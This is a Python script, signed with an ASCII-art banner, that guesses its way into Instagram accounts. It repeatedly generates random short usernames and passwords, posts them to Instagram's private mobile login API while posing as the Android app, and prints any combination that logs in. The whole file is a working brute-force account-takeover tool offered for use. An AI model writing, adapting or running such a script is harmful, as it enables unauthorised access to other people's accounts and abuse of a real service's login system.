try: 
    import requests
    import uuid
    import time
    import colorama
    import string
    import random
except Exception as e:
    print(e)

from colorama import Fore, Style

logo = (Fore.RED + """
Created By
 _           _ _   _    ___   ___  _____             
| |         (_) | | |  / _ \ / _ \|  __ \            
| |     __ _ _| |_| |_| (_) | (_) | |  | | _____   __
| |    / _` | | __| '_ \__, |> _ <| |  | |/ _ \ \ / /
| |___| (_| | | |_| | | |/ /| (_) | |__| |  __/\ V / 
|______\__,_|_|\__|_| |_/_/  \___/|_____/ \___| \_/   """+Style.RESET_ALL);
     
print(logo)
print("   ")


print(Fore.YELLOW+"""Hey, please enter repeat number to continue """)

print("   ")
try:
    count = int(input("'How many account: "))
except ValueError:
    print("Error, it must be an integer")
    

def login(user, password, cc):    
    r = requests.Session()
    
    uid = str(uuid.uuid4())
    
    url = "https://i.instagram.com/api/v1/accounts/login/"
    
    headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        "Accept": "/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "X-IG-Capabilities": "3brTvw==",
        "X-IG-Connection-Type": "WIFI",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Host': 'i.instagram.com' 
    }
    
    data = { 
        '_uuid': uid,
        'username': user,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
        'queryParams': '{}',
        'optIntoOneTap': 'false',
        'device_id': uid,
        'from_reg': 'false',
        '_csrftoken': 'missing',
        'login_attempt_count': '0' 
    }
    
    loginreq = r.post(url, data = data, headers = headers, allow_redirects = True)
    
    #print(loginreq.text)
    
    if loginreq.text.find("is_private") >= 0:
        print(" ")
        print(Fore.YELLOW+" " + user + ":" + password + " Login Successfully - " + cc)
        print(" ")
    else:
        print(" ")
        print(Fore.RED+" " + user + ":" + password + " Failed Login! - " + cc)
        print(" ")

def startCheck(c1):
    done = 0
    while done <= int(c1):
        done += 1
        userr = randomChar(4)
        passr = randomChar(10)
        login(userr, passr, done)
        time.sleep(0.1)

def randomChar(c):
    end = ""
    now = 0
    while now < c:
        end += random.choice("abcdefghijkmnopqrstuvwxyz023456789_")
        now += 1
    return end.lower()


done = 0
while done <= count:
    done += 1
    userr = randomChar(4)
    passr = randomChar(10)
    login(userr, passr, done)
    time.sleep(0.1)
